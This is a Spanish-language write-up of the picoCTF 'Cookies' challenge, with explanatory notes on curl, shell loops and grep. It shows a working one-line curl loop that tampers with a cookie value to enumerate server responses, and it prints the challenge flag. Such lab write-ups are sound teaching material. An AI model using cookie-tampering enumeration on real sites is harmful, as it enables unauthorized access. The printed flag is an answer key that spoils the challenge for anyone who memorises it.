## **Reto**: Cookies
## **Descripción**
Who doesn't love cookies? Try to figure out the best one. http://wily-courier.picoctf.net:61687/
## **Solución**
1. Se entra al enlace, donde se presenta un buscador de galletas. Al ingresar un nombre de galleta sugerido snickerdoodle, el sitio responde con un mensaje de validación.
2. Al inspeccionar las cookies del sitio, se identifica una cookie llamada `name`.
3. Para resolverlo, se utiliza la consola y el comando `curl` dentro de un ciclo for para realizar una búsqueda de la bandera.
4. Se ejecuta un ciclo `for` realizando una petición en cada iteración y filtrando la respuesta con el comando `grep` para localizar la cadena picoCTF:
   `for i in {0..20}; do curl -s -b "name=$i" http://wily-courier.picoctf.net:61687/check | grep "picoCTF"; done`

Y así fue como se obtuvo la bandera de este reto.

```
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

## **Notas adicionales**
- **`curl`**: Herramientas de línea de comandos para transferir datos con sintaxis de URL.
    - `-b` (cookie): Permite enviar una cookie específica al servidor en la petición.
- **`for i in {0..20}; do ... done`**: Ciclo de shell que repite una acción variando el valor de la variable `i` desde 0 hasta 20.
- **`grep`**: Utilidad de búsqueda que filtra y muestra solo las líneas que contienen un patrón de texto específico (en este caso, "picoCTF").
- **`|` : Operador que toma la salida de un comando (curl) y la entrega como entrada al siguiente (grep).
## Referencias**
https://www.youtube.com/watch?v=LseQ-XWCXVo&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=12